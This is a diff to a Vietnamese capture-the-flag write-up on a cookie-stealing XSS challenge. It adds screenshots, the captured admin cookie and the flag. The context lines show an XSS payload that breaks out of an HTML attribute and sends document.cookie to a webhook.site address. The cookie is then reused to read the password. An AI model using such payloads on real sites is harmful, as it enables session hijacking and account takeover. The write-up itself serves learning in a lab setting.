@@ -110,5 +110,11 @@ Tương tự các bài stored, dùng payload gửi cookie vào host của mình.
 
 Payload:`"><img src=1 onerror='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?cmd="+document.cookie'/><p class="`
 
-Ta thu được admin cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`
+![Screenshot 2023-11-11 225413](https://github.com/aQ05/Write-up/assets/121664384/1e07790b-2e14-4401-9481-6857fc87974c)
+
+Ta thu được admin cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`. Có ADMIN_COOKIE, ta thay đổi vào cookie và `GET` pass:
+
+![Screenshot 2023-11-12 003334](https://github.com/aQ05/Write-up/assets/121664384/9de048c4-c89e-4418-b8a3-49a05c220968)
+
 ## Flag
+`E5HKEGyCXQVsYaehaqeJs0AfV`
